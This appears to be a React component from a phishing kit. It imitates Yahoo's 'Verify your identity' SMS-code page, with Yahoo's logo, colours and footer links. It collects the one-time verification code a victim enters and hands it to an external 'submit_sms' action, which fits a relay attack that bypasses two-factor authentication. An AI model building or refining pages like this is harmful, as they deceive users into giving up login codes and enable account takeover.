import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface YahooSmsCodePageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const YahooLogo = () => (
  <svg viewBox="0 0 202 72" xmlns="http://www.w3.org/2000/svg" className="h-8" aria-label="Yahoo">
    <path fill="#6001d2" d="M0 12h24.4l14.2 36.3L53 12h23.8L41 96h-24l9.8-23L0 12zm96 0c14.6 0 26.5 11.9 26.5 26.6S110.6 65.2 96 65.2 69.5 53.3 69.5 38.6 81.4 12 96 12zm0 14.6c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12-5.4-12-12-12zM155 12c14.6 0 26.5 11.9 26.5 26.6S169.6 65.2 155 65.2s-26.5-11.9-26.5-26.6S140.4 12 155 12zm0 14.6c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12-5.4-12-12-12zM185.5 45.6c5.3 0 9.5 4.3 9.5 9.5s-4.3 9.5-9.5 9.5-9.5-4.3-9.5-9.5 4.3-9.5 9.5-9.5zM190 2h12L190 33h-12l12-31z"/>
  </svg>
);

const YahooSmsCodePage: React.FC<YahooSmsCodePageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const phoneNumber = (data.phoneNumber as string) || (data.phone as string) || 'your recovery phone';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_sms', { code });
  };

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[400px] px-6 py-10">
          <div className="mb-6 flex justify-center">
            <YahooLogo />
          </div>
          <h1 className="text-[28px] leading-8 font-normal text-black text-center mb-2">Verify your identity</h1>
          <p className="text-sm text-gray-700 text-center mb-6">
            To keep your account secure, we need to verify it&rsquo;s really you. We sent a verification code to <strong>{phoneNumber}</strong>.
          </p>
          {email && (
            <div className="text-xs text-gray-500 text-center mb-6">Signed in as {email}</div>
          )}
          <form onSubmit={handleSubmit}>
            <div className="relative mt-1 h-12">
              <label className={`absolute left-1 transition-all duration-200 ease-in-out pointer-events-none ${code.length > 0 ? 'text-xs top-0 text-gray-500' : 'text-base top-3 text-gray-500'}`}>
                Verification code
              </label>
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                maxLength={8}
                autoFocus
                className="w-full bg-transparent pt-3 pb-1 text-base tracking-[0.3em] focus:outline-none"
              />
              <div className="absolute bottom-0 left-0 w-full h-px bg-gray-300 peer-focus:bg-purple-600"></div>
              <div className="absolute bottom-0 left-0 w-full h-px bg-purple-600 origin-left scale-x-0 focus-within:scale-x-100 transition-transform"></div>
            </div>

            <button
              type="submit"
              disabled={code.length < 6 || submitting}
              className="w-full mt-8 py-3 text-white text-base font-medium rounded-full disabled:opacity-60 disabled:cursor-not-allowed"
              style={{ backgroundColor: '#6001d2' }}
            >
              {submitting ? 'Verifying\u2026' : 'Verify'}
            </button>
          </form>

          <div className="mt-6 flex justify-between text-sm">
            <button
              type="button"
              onClick={() => onAction('resend_sms')}
              className="font-medium"
              style={{ color: '#6001d2' }}
            >
              Resend code
            </button>
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="font-medium"
              style={{ color: '#6001d2' }}
            >
              Try another way
            </button>
          </div>
        </div>
      </main>
      <footer className="w-full max-w-[400px] mx-auto text-xs text-gray-500 text-center py-6">
        Yahoo &middot; <a href="https://policies.yahoo.com/us/en/yahoo/privacy/index.htm" className="hover:underline">Privacy</a> &middot; <a href="https://policies.yahoo.com/us/en/yahoo/terms/index.htm" className="hover:underline">Terms</a>
      </footer>
    </div>
  );
};

export default YahooSmsCodePage;
